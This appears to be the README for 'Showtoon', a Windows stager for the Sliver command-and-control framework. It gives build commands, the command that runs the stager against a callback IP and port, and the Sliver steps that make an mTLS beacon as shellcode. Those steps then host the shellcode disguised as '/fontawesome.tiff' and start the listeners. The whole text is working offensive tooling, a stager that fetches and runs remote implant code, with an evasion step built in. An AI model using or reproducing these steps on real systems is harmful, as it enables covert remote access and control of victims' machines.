# Showtoon Sliver Stager


### Build

With just

```
just build
```

or

```
cargo build --release --target x86_64-pc-windows-gnu
```

### Usage

Use showtoon to reach out to the stager
```
.\showtoon.exe CALLBACK_IP:HTTPS_PORT
```


### Sliver

Create a test profile for the stager
```
profiles new --mtls YOUR_IP:8443 beacon --skip-symbols --format shellcode showtoon
```

```
profiles stage showtoon -s shellcode.bin
```

Add implant to http server
```
websites add-content --content shellcode.bin --web-path /fontawesome.tiff --website test
```

Host the implant
```
https --website test --lport 8080
```

Start the http listener
```
mtls -l 8443
```
